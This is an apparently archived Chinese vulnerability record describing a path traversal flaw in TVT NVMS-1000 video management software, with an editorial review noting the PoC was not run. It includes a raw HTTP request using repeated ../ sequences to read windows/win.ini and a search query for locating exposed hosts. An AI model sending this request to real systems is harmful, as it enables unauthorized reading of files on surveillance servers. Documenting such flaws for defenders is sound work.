---
version: "TVT NVMS-1000"
source: "Threekiii/Awesome-POC"
id: "vw-8dd310a6dcb6f8e5ecb2b952"
entity_id: "ve-b96f9691010b43af89a032d4"
schema_version: "1"
title: "TVT数码科技 NVMS-1000 路径遍历漏洞"
product: "TVT NVMS-1000 Windows视频管理软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Windows服务路径处理不规范，无Cookie；软件版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80%20NVMS-1000%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
canonical: "Web安全/智能设备/TVT/TVT数码科技-NVMS-1000-路径遍历漏洞.md"
relation_type: "duplicate_of"
---

# TVT数码科技 NVMS-1000 路径遍历漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TVT NVMS-1000 Windows视频管理软件
- 本文讨论：Web路径穿越读取win.ini
- 版本、权限与配置前提：Windows服务路径处理不规范，无Cookie；软件版本未知
- 资料类型：目录穿越PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 实际为Windows视频管理系统软件，IoT目录可关联但不等同摄像机固件
- 没有CVE/版本/修复；原始../路径需要客户端保留，不可由浏览器规范化吞掉
- 响应只图片，任意文件受进程权限限制
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 原公告/Windows部署范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件

## 漏洞影响

```
TVT NVMS-1000
```

## 网络测绘

```
app="TVT-NVMS-1000"
```

## 漏洞复现

登录页面如下


![](./.resource/TVT数码科技NVMS-1000路径遍历漏洞/media/202202162301376.png)发送请求包读取文件

```http
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

![](./.resource/TVT数码科技NVMS-1000路径遍历漏洞/media/202202162302589.png)


---

> 来源：Threekiii/Awesome-POC
